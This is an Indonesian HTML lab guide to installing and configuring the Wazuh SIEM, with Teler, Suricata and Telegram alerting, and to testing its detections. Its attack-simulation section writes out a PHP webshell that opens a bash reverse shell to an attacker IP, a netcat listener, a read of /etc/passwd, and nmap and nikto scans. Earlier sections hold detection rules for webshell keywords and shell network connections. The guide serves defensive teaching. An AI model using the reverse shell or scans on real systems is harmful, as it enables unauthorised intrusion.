<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instalasi Wazuh - Panduan SIEM</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Inter', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f9fafb;
      color: #111827;
      line-height: 1.7;
    }
    header {
      background: #1e3a8a;
      color: white;
      padding: 2rem 1rem;
      text-align: center;
    }
    main {
      max-width: 900px;
      margin: 2rem auto;
      padding: 1rem 2rem;
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
    }
    h1, h2 {
      color: #1e40af;
    }
    details {
      margin: 1rem 0;
      border: 1px solid #e5e7eb;
      border-radius: 6px;
      padding: 0.8rem 1rem;
      background: #f9fafb;
    }
    summary {
      cursor: pointer;
      font-weight: 600;
      font-size: 1.1rem;
      color: #111827;
    }
    summary:hover {
      color: #1d4ed8;
    }
    pre {
      background: #f3f4f6;
      padding: 1rem;
      overflow-x: auto;
      border-left: 4px solid #3b82f6;
      border-radius: 4px;
    }
    code {
      font-family: monospace;
    }
  </style>
</head>
<body>
  <header>
    <h1>Panduan Instalasi Wazuh SIEM</h1>
    <p>Langkah-langkah instalasi server dan agent untuk sistem keamanan Wazuh</p>
  </header>

  <main>
    <h2>4.2 Instalasi Wazuh</h2>

    <details open>
      <summary><strong>a. Instalasi Wazuh Server</strong></summary>
      <p><strong>Wazuh Server</strong> adalah komponen utama yang mengelola, menganalisis, dan menyimpan data dari endpoint.</p>

      <ol>
        <li><strong>Instalasi Curl</strong>
          <pre><code>sudo apt install curl -y</code></pre>
        </li>
        <li><strong>Unduh dan Jalankan Skrip Instalasi Wazuh</strong>
          <pre><code>curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh && sudo bash ./wazuh-install.sh -a</code></pre>
        </li>
        <li><strong>Catat Informasi Login</strong>
          <p>Setelah instalasi selesai, catat username dan password dari output <code>INFO: — Summary —</code>.</p>
        </li>
        <li><strong>Akses Wazuh Dashboard</strong>
          <pre><code>https://&lt;wazuh-dashboard-ip&gt;</code></pre>
          <p>Gantilah <code>&lt;wazuh-dashboard-ip&gt;</code> dengan alamat IP server Anda.</p>
        </li>
      </ol>
    </details>

    <details>
      <summary><strong>b. Instalasi Wazuh Agent</strong></summary>
      <p><strong>Wazuh Agent</strong> diinstal pada endpoint seperti server/desktop yang akan dikirim datanya ke server utama.</p>

      <ol>
        <li><strong>Tambahkan Repositori Wazuh</strong>
          <pre><code>curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring \
--keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg

echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | \
tee -a /etc/apt/sources.list.d/wazuh.list

apt-get update</code></pre>
        </li>
        <li><strong>Instalasi Wazuh Agent</strong>
          <pre><code>WAZUH_MANAGER="&lt;SERVER_IP&gt;" apt-get install wazuh-agent</code></pre>
          <p>Gantilah <code>&lt;SERVER_IP&gt;</code> dengan IP Wazuh Server.</p>
        </li>
        <li><strong>Jalankan Wazuh Agent</strong>
          <pre><code>systemctl daemon-reload
systemctl enable wazuh-agent
systemctl start wazuh-agent</code></pre>
        </li>
      </ol>
    </details>

    <h2>4.3 Konfigurasi Wazuh</h2>

<details open>
  <summary><strong>a. File Integrity Monitoring (FIM) pada Wazuh</strong></summary>

  <p><strong>FIM</strong> bertugas memantau perubahan file dan direktori penting untuk mencegah aktivitas mencurigakan atau peretasan. Berikut tahapan konfigurasi lengkapnya:</p>

  <ol>
    <li><strong>Instalasi Apache Web Server & PHP</strong>
      <pre><code>sudo apt update
sudo apt install apache2
sudo apt install --no-install-recommends php</code></pre>
    </li>

    <li><strong>Verifikasi Apache</strong>
      <p>Buka <code>http://&lt;AGENT_IP&gt;</code> dari browser untuk melihat halaman default Apache.</p>
    </li>

    <li><strong>Ubah Konfigurasi Ossec untuk FIM</strong>
      <pre><code>&lt;directories realtime="yes" check_all="yes" report_changes="yes"&gt;/var/www/html&lt;/directories&gt;</code></pre>
      <p>Edit pada file <code>/var/ossec/etc/ossec.conf</code> di bagian <code>&lt;syscheck&gt;</code>.</p>
    </li>

    <li><strong>Instalasi auditd</strong>
      <pre><code>sudo apt update
sudo apt install auditd</code></pre>
    </li>

    <li><strong>Forward log auditd ke Wazuh</strong>
      <pre><code>&lt;ossec_config&gt;
  &lt;localfile&gt;
    &lt;location&gt;/var/log/audit/audit.log&lt;/location&gt;
    &lt;log_format&gt;audit&lt;/log_format&gt;
  &lt;/localfile&gt;
&lt;/ossec_config&gt;</code></pre>
    </li>

    <li><strong>Temukan User ID Apache</strong>
      <pre><code>sudo apachectl -S</code></pre>
    </li>

    <li><strong>Tambahkan Auditd Rules</strong>
      <pre><code># Ganti &lt;USER_ID&gt; sesuai hasil sebelumnya
-a always,exit -F arch=b32 -S execve -F uid=&lt;USER_ID&gt; -F key=webshell_command_exec
-a always,exit -F arch=b64 -S execve -F uid=&lt;USER_ID&gt; -F key=webshell_command_exec

-a always,exit -F arch=b64 -S socket -F a0=10 -F euid=&lt;USER_ID&gt; -k webshell_net_connect
-a always,exit -F arch=b64 -S socket -F a0=2 -F euid=&lt;USER_ID&gt; -k webshell_net_connect
-a always,exit -F arch=b32 -S socket -F a0=10 -F euid=&lt;USER_ID&gt; -k webshell_net_connect
-a always,exit -F arch=b32 -S socket -F a0=2 -F euid=&lt;USER_ID&gt; -k webshell_net_connect</code></pre>
    </li>

    <li><strong>Monitoring Command via Shell</strong>
      <pre><code>&lt;ossec_config&gt;
  &lt;localfile&gt;
    &lt;log_format&gt;full_command&lt;/log_format&gt;
    &lt;command&gt;ss -nputw | egrep '"sh"|"bash"|"csh"|"ksh"|"zsh"' | awk '{{ print $5 "|" $6 }}'&lt;/command&gt;
    &lt;alias&gt;webshell connections&lt;/alias&gt;
    &lt;frequency&gt;120&lt;/frequency&gt;
  &lt;/localfile&gt;
&lt;/ossec_config&gt;</code></pre>
    </li>

    <li><strong>Restart Auditd & Wazuh Agent</strong>
      <pre><code>sudo systemctl restart auditd
sudo systemctl restart wazuh-agent</code></pre>
    </li>

    <li><strong>Tambahkan Custom Rules</strong>
      <p>Buat file <code>webshell_rules.xml</code> di <code>/var/ossec/etc/rules/</code>:</p>
      <pre><code>sudo gedit /var/ossec/etc/rules/webshell_rules.xml</code></pre>
    </li>

    <li><strong>Konfigurasi Rules PHP Webshell</strong>
      <pre><code>&lt;group name="linux, webshell, windows,"&gt;
  &lt;rule id="100500" level="12"&gt;
    &lt;if_sid&gt;554&lt;/if_sid&gt;
    &lt;field name="file" type="pcre2"&gt;(?i).php$|.phtml$|.php3$|.php4$|.php5$|.phps$&lt;/field&gt;
    &lt;description&gt;[File creation]: Possible web shell file created&lt;/description&gt;
  &lt;/rule&gt;

  &lt;rule id="100501" level="12"&gt;
    &lt;if_sid&gt;550&lt;/if_sid&gt;
    &lt;field name="file" type="pcre2"&gt;(?i).php$|.phtml$|.php3$|.php4$&lt;/field&gt;
    &lt;description&gt;[File modification]: Possible web shell content added&lt;/description&gt;
  &lt;/rule&gt;

  &lt;rule id="100502" level="15"&gt;
    &lt;if_sid&gt;100501&lt;/if_sid&gt;
    &lt;field name="changed_content" type="pcre2"&gt;(?i)eval|exec|base64_decode|system&lt;/field&gt;
    &lt;description&gt;[File Modification]: Web shell detected&lt;/description&gt;
  &lt;/rule&gt;
&lt;/group&gt;</code></pre>
    </li>

    <li><strong>Rule Tambahan: Command Execution (Linux & Windows)</strong>
      <p>Masukkan rules tambahan untuk mendeteksi eksekusi shell dan koneksi jaringan.</p>
    </li>

    <li><strong>Tambahkan Decoder</strong>
      <p>Di <code>/var/ossec/etc/decoders/local_decoder.xml</code></p>
      <pre><code>&lt;decoder name="network-traffic-child"&gt;
  &lt;parent&gt;ossec&lt;/parent&gt;
  &lt;prematch&gt;^output: 'webshell connections':&lt;/prematch&gt;
  &lt;regex&gt;(\d+.\d+.\d+.\d+):(\d+)\|(\d+.\d+.\d+.\d+):(\d+)&lt;/regex&gt;
  &lt;order&gt;local_ip, local_port, foreign_ip, foreign_port&lt;/order&gt;
&lt;/decoder&gt;</code></pre>
    </li>

    <li><strong>Rules Koneksi Jaringan dari Script</strong>
      <pre><code>&lt;group name="linux, webshell,"&gt;
  &lt;rule id="100510" level="12"&gt;
    &lt;decoded_as&gt;ossec&lt;/decoded_as&gt;
    &lt;match&gt;ossec: output: 'webshell connections'&lt;/match&gt;
    &lt;description&gt;Script attempting network connection&lt;/description&gt;
  &lt;/rule&gt;
&lt;/group&gt;</code></pre>
    </li>

    <li><strong>Restart Wazuh Manager</strong>
      <pre><code>sudo systemctl restart wazuh-manager</code></pre>
    </li>
  </ol>
</details>
    <h3>b. Integrasi Wazuh dengan Teler</h3>

<details>
  <summary><strong>Integrasi Teler - HTTP Intrusion Detection</strong></summary>

  <p><strong>Teler</strong> adalah IDS HTTP ringan yang membantu mendeteksi eksploitasi web seperti injeksi HTML, directory traversal, dan serangan upload file. Berikut adalah tahapan integrasinya:</p>

  <ol>
    <li><strong>Download dan Ekstrak Teler</strong>
      <pre><code>wget https://github.com/kitabisa/teler/releases/download/v2.0.0-rc.3/teler_2.0.0-rc.3_linux_amd64.tar.gz
tar -xvzf teler_2.0.0-rc.3_linux_amd64.tar.gz</code></pre>
    </li>

    <li><strong>Download Template Konfigurasi</strong>
      <pre><code>wget https://github.com/kitabisa/teler/blob/v2/teler.example.yaml</code></pre>
    </li>

    <li><strong>Rename File Konfigurasi</strong>
      <pre><code>mv teler.example.yaml teler.yaml</code></pre>
    </li>

    <li><strong>Edit <code>log_format</code> di <code>teler.yaml</code></strong>
      <pre><code>log_format: |
  $remote_addr - $remote_user [$time_local] "$request_method $request_uri $request_protocol" $status $body_bytes_sent "$http_referer" "$http_user_agent"</code></pre>
    </li>

    <li><strong>Edit <code>logs</code> di <code>teler.yaml</code></strong>
      <pre><code>logs:
  active: true
  json: true
  path: /var/log/teler/output.log</code></pre>
    </li>

    <li><strong>Buat Direktori Log</strong>
      <pre><code>cd /var/log
sudo mkdir teler</code></pre>
    </li>

    <li><strong>Tambahkan Konfigurasi di Wazuh Agent</strong>
      <pre><code>&lt;localfile&gt;
  &lt;log_format&gt;syslog&lt;/log_format&gt;
  &lt;location&gt;/var/log/teler/output.log&lt;/location&gt;
&lt;/localfile&gt;</code></pre>
    </li>

    <li><strong>Restart Wazuh Agent</strong>
      <pre><code>systemctl restart wazuh-agent</code></pre>
    </li>

    <li><strong>Jalankan Teler</strong>
      <pre><code>sudo tail -f /var/log/apache2/access.log | ./teler -c teler.yaml</code></pre>
    </li>

    <li><strong>Tambahkan Custom Rules ke <code>local_rules.xml</code></strong>
      <pre><code>&lt;group name="teler,"&gt;
  &lt;rule id="100012" level="10"&gt;
    &lt;decoded_as&gt;json&lt;/decoded_as&gt;
    &lt;field name="category" type="pcre2"&gt;Common Web Attack(: .*)?|CVE-[0-9]{4}-[0-9]{4,7}&lt;/field&gt;
    &lt;field name="request_uri" type="pcre2"&gt;\D.+|-&lt;/field&gt;
    &lt;field name="remote_addr" type="pcre2"&gt;\d+.\d+.\d+.\d+|::1&lt;/field&gt;
    &lt;mitre&gt;
      &lt;id&gt;T1210&lt;/id&gt;
    &lt;/mitre&gt;
    &lt;description&gt;teler detected $(category) against resource $(request_uri) from $(remote_addr)&lt;/description&gt;
  &lt;/rule&gt;

  &lt;rule id="100013" level="10"&gt;
    &lt;decoded_as&gt;json&lt;/decoded_as&gt;
    &lt;field name="category" type="pcre2"&gt;Bad (IP Address|Referrer|Crawler)&lt;/field&gt;
    &lt;field name="request_uri" type="pcre2"&gt;\D.+|-&lt;/field&gt;
    &lt;field name="remote_addr" type="pcre2"&gt;\d+.\d+.\d+.\d+|::1&lt;/field&gt;
    &lt;mitre&gt;
      &lt;id&gt;T1590&lt;/id&gt;
    &lt;/mitre&gt;
    &lt;description&gt;teler detected $(category) against resource $(request_uri) from $(remote_addr)&lt;/description&gt;
  &lt;/rule&gt;

  &lt;rule id="100014" level="10"&gt;
    &lt;decoded_as&gt;json&lt;/decoded_as&gt;
    &lt;field name="category" type="pcre2"&gt;Directory Bruteforce&lt;/field&gt;
    &lt;field name="request_uri" type="pcre2"&gt;\D.+|-&lt;/field&gt;
    &lt;field name="remote_addr" type="pcre2"&gt;\d+.\d+.\d+.\d+|::1&lt;/field&gt;
    &lt;mitre&gt;
      &lt;id&gt;T1595&lt;/id&gt;
    &lt;/mitre&gt;
    &lt;description&gt;teler detected $(category) against resource $(request_uri) from $(remote_addr)&lt;/description&gt;
  &lt;/rule&gt;
&lt;/group&gt;</code></pre>
    </li>

    <li><strong>Restart Wazuh Manager</strong>
      <pre><code>systemctl restart wazuh-manager</code></pre>
    </li>
  </ol>
</details>
<h3>c. Integrasi Wazuh dengan Suricata</h3>

<details>
  <summary><strong>Integrasi Suricata - Network IDS</strong></summary>

  <p><strong>Suricata</strong> adalah NIDS yang melakukan deep packet inspection, mendeteksi intrusi jaringan, dan menghasilkan log rinci. Berikut integrasi dengan Wazuh:</p>

  <ol>
    <li><strong>Instalasi Suricata</strong>
      <pre><code>sudo apt install suricata</code></pre>
    </li>

    <li><strong>Instalasi Rules</strong>
      <pre><code>sudo suricata-update</code></pre>
    </li>

    <li><strong>Jalankan Suricata</strong>
      <pre><code>sudo systemctl daemon-reload
sudo systemctl enable suricata
sudo systemctl start suricata</code></pre>
    </li>

    <li><strong>Verifikasi Apache Web Server</strong>
      <pre><code>sudo apt update
sudo apt install apache2
sudo apt install --no-install-recommends php</code></pre>
      <p>Buka <code>http://&lt;UBUNTU_IP&gt;</code> untuk verifikasi halaman default Apache.</p>
    </li>

    <li><strong>Buat Agent Group "Suricata"</strong>
      <pre><code>sudo /var/ossec/bin/agent_groups -a -g Suricata -q
sudo /var/ossec/bin/manage_agents -l
sudo /var/ossec/bin/agent_groups -a -i &lt;AGENT_ID&gt; -g Suricata -q</code></pre>
    </li>

    <li><strong>Tambahkan Konfigurasi Wazuh Agent</strong>
      <pre><code>&lt;agent_config&gt;
  &lt;localfile&gt;
    &lt;log_format&gt;json&lt;/log_format&gt;
    &lt;location&gt;/var/log/suricata/eve.json&lt;/location&gt;
  &lt;/localfile&gt;
&lt;/agent_config&gt;</code></pre>
    </li>

    <li><strong>Tambahkan Decoder Suricata</strong>
      <pre><code>&lt;decoder name="json"&gt;
  &lt;prematch&gt;^{\s*"&lt;/prematch&gt;
&lt;/decoder&gt;

&lt;decoder name="json_child"&gt;
  &lt;parent&gt;json&lt;/parent&gt;
  &lt;regex type="pcre2"&gt;"src_ip":"([^"]+)"&lt;/regex&gt;
  &lt;order&gt;srcip&lt;/order&gt;
&lt;/decoder&gt;

&lt;decoder name="json_child"&gt;
  &lt;parent&gt;json&lt;/parent&gt;
  &lt;plugin_decoder&gt;JSON_Decoder&lt;/plugin_decoder&gt;
&lt;/decoder&gt;</code></pre>
    </li>

    <li><strong>Tambahkan Custom Rules</strong>
      <pre><code>&lt;group name="suricata_rules,"&gt;
  &lt;rule id="100015" level="12"&gt;
    &lt;if_sid&gt;86600&lt;/if_sid&gt;
    &lt;field name="event_type"&gt;^alert$&lt;/field&gt;
    &lt;match&gt;ET SCAN Nmap Scripting Engine User-Agent Detected&lt;/match&gt;
    &lt;description&gt;Nmap scripting engine detected.&lt;/description&gt;
    &lt;mitre&gt;&lt;id&gt;T1595&lt;/id&gt;&lt;/mitre&gt;
  &lt;/rule&gt;
&lt;/group&gt;</code></pre>
    </li>

    <li><strong>Konfigurasi Active Response Firewall</strong>
      <pre><code>&lt;ossec_config&gt;
  &lt;command&gt;
    &lt;name&gt;firewall-drop&lt;/name&gt;
    &lt;executable&gt;firewall-drop&lt;/executable&gt;
    &lt;timeout_allowed&gt;yes&lt;/timeout_allowed&gt;
  &lt;/command&gt;
&lt;/ossec_config&gt;

&lt;active-response&gt;
  &lt;command&gt;firewall-drop&lt;/command&gt;
  &lt;location&gt;local&lt;/location&gt;
  &lt;rules_id&gt;100015&lt;/rules_id&gt;
  &lt;timeout&gt;180&lt;/timeout&gt;
&lt;/active-response&gt;</code></pre>
    </li>

    <li><strong>Restart Wazuh Manager</strong>
      <pre><code>sudo systemctl restart wazuh-manager</code></pre>
    </li>
  </ol>
</details>
<h3>d. Integrasi Wazuh dengan Telegram</h3>

<details>
  <summary><strong>Integrasi Telegram Bot untuk Alert</strong></summary>

  <p>Integrasi ini memungkinkan alert dari Wazuh dikirim langsung ke grup Telegram melalui bot khusus.</p>

  <ol>
    <li><strong>Buat Telegram Bot</strong>
      <p>Gunakan <code>@BotFather</code> di Telegram:</p>
      <ul>
        <li>Ketik <code>/start</code> dan <code>/newbot</code></li>
        <li>Simpan HTTP API token</li>
      </ul>
    </li>

    <li><strong>Dapatkan Group ID</strong>
      <p>Tambahkan bot ke grup, lalu gunakan <code>@myidbot</code> dan perintah:</p>
      <pre><code>/getgroupid</code></pre>
    </li>

    <li><strong>Install pip dan requests</strong>
      <pre><code>sudo apt install pip -y
pip install requests</code></pre>
    </li>

    <li><strong>Buat File <code>custom-telegram</code></strong>
      <pre><code>sudo nano /var/ossec/integrations/custom-telegram</code></pre>
      <p>Isi skrip shell yang memanggil skrip Python Telegram (lihat dokumentasi Wazuh).</p>
    </li>

    <li><strong>Buat File <code>custom-telegram.py</code></strong>
      <pre><code>sudo nano /var/ossec/integrations/custom-telegram.py</code></pre>
      <p>Isi dengan script Python seperti ini:</p>
      <pre><code>import sys, json, requests

CHAT_ID = "-82643xxxx"
alert_json = json.loads(open(sys.argv[1]).read())
hook_url = sys.argv[3]

msg = {
    'chat_id': CHAT_ID,
    'text': f"Description: {alert_json['rule'].get('description')}\nLevel: {alert_json['rule'].get('level')}\nAgent: {alert_json['agent'].get('name')}"
}
requests.post(hook_url, json=msg)
sys.exit(0)</code></pre>
    </li>

    <li><strong>Set Permission</strong>
      <pre><code>sudo chown root:wazuh /var/ossec/integrations/custom-telegram*
sudo chmod 750 /var/ossec/integrations/custom-telegram*</code></pre>
    </li>

    <li><strong>Tambahkan Konfigurasi di <code>ossec.conf</code></strong>
      <pre><code>&lt;integration&gt;
  &lt;name&gt;custom-telegram&lt;/name&gt;
  &lt;level&gt;10&lt;/level&gt;
  &lt;hook_url&gt;https://api.telegram.org/bot&lt;API_KEY&gt;/sendMessage&lt;/hook_url&gt;
  &lt;alert_format&gt;json&lt;/alert_format&gt;
&lt;/integration&gt;</code></pre>
    </li>

    <li><strong>Restart Wazuh Manager</strong>
      <pre><code>sudo systemctl restart wazuh-manager</code></pre>
    </li>
  </ol>
</details>
    <h2>4.4 Simulasi Serangan</h2>

<details>
  <summary><strong>a. Webshell Attack</strong></summary>
  <p>
    <strong>Webshell</strong> adalah skrip berbahaya yang diunggah ke server web untuk memberikan akses kendali jarak jauh kepada penyerang. Pada simulasi ini, serangan dilakukan dari Kali Linux ke Ubuntu Agent.
  </p>

  <ol>
    <li>Buat file skrip:
      <pre><code>touch /var/www/html/webshell-script.php</code></pre>
    </li>
    <li>Isi file dengan konten sederhana:
      <pre><code>echo 'Hello world!' > /var/www/html/webshell-script.php</code></pre>
    </li>
    <li>Ganti dengan skrip reverse shell:
      <pre><code>echo -e "&lt;?php exec('/bin/bash -c \\"bash -i &gt;&amp; /dev/tcp/&lt;KALI_IP&gt;/4444 0&gt;&amp;1\\"');?&gt;" &gt; /var/www/html/webshell-script.php</code></pre>
    </li>
    <li>Dari Kali Linux, jalankan listener:
      <pre><code>nc -lvp 4444</code></pre>
    </li>
    <li>Akses melalui browser:
      <pre><code>http://&lt;UBUNTU_IP&gt;/webshell-script.php</code></pre>
    </li>
    <li>Koneksi akan terbentuk di Kali Linux, jalankan perintah seperti:
      <pre><code>whoami
cat /etc/passwd</code></pre>
    </li>
    <li>Cek dasbor Wazuh:
      <img src="./webshell.png" alt="Alert Webshell Wazuh" style="max-width:100%; margin-top:1rem; border:1px solid #ddd; border-radius:6px;" />
    </li>
  </ol>
</details>

<details>
  <summary><strong>b. Nmap Scan</strong></summary>
  <p>
    <strong>Nmap</strong> digunakan untuk melakukan pemindaian terhadap endpoint Ubuntu Agent dari Kali Linux.
  </p>

  <pre><code>sudo nmap -sS --script=vuln &lt;AGENT_IP&gt;</code></pre>

  <p>
    Serangan ini akan memicu <strong>active response</strong> dari Wazuh berupa perintah <code>firewall-drop</code> untuk memblokir IP selama 180 detik.
  </p>

  <img src="./nmap.png" alt="Alert Nmap Wazuh" style="max-width:100%; margin-top:1rem; border:1px solid #ddd; border-radius:6px;" />
</details>

<details>
  <summary><strong>c. Web Attack (Nikto)</strong></summary>
  <p>
    Gunakan <strong>Nikto</strong> dari Kali Linux untuk menyerang web server yang rentan:
  </p>

  <pre><code>nikto -h http://&lt;AGENT_IP&gt;/</code></pre>

  <p>
    Setelah serangan, Wazuh akan menganalisis log dari server dan menghasilkan alert berdasarkan rule default atau dari integrasi Teler.
  </p>

  <img src="./webattack.png" alt="Alert Web Attack Wazuh" style="max-width:100%; margin-top:1rem; border:1px solid #ddd; border-radius:6px;" />
</details>

  </main>
</body>
</html>
